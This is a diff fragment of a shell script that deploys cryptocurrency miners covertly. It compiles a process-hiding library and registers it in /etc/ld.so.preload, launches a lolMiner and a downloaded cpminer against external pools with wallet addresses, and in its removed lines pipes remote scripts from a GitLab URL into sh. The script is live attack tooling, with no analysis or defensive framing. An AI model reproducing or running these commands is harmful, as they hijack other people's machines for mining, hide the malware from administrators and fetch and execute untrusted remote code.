@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --pass x & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/Beton.sh | sh & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/Beton.sh | sh & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
+./graftcp/graftcp ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --pass x & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4
